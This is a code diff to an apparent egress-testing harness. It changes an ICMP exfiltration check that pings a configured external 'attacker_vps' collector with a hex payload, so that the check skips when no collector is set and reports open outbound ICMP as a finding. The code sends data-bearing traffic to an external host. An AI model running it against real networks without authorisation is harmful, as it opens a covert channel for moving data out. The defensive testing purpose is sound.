@@ -41,7 +41,14 @@ META = {
 
 
 def run(target, ctx):
-    dest = ctx.cfg("attacker_vps") or target
+    # Exfil is OUTBOUND to an external collector. With no attacker_vps there is no
+    # external endpoint to test, and falling back to the lab target (reachable by
+    # definition) would score a false ICMP-EXFIL-OPEN — so SKIP, per the egress rule.
+    dest = ctx.cfg("attacker_vps")
+    if not dest:
+        return "# ICMP exfil test (Family E)\n" + U.skip(
+            "attacker_vps not configured — no external collector to exfil to (set "
+            "attacker_vps / HARNESS_CFG_ATTACKER_VPS). Not testing against the lab target.")
     out = [f"# ICMP exfil test vs {dest} (Family E) — marked synthetic payload"]
     try:
         p = subprocess.run(["ping", "-c", "3", "-p", _PAYLOAD_HEX, dest],
@@ -49,8 +56,9 @@ def run(target, ctx):
         replied = "bytes from" in p.stdout and " 0 received" not in p.stdout
         out.append(p.stdout.strip()[-400:])
         if replied:
-            out.append("ICMP-EXFIL-OPEN — echo replies returned carrying the data payload; "
-                       "ICMP can ferry arbitrary bytes out. [FINDING] restrict/monitor "
+            out.append("ICMP-EXFIL-OPEN — payload-bearing echo requests reached the external "
+                       f"collector ({dest}) and were answered: outbound ICMP to the internet is "
+                       "permitted and can ferry arbitrary bytes. [FINDING] restrict/monitor "
                        "outbound ICMP (volumetric analytics).")
         else:
             out.append("ICMP channel blocked — no usable replies (ICMP egress restricted)")
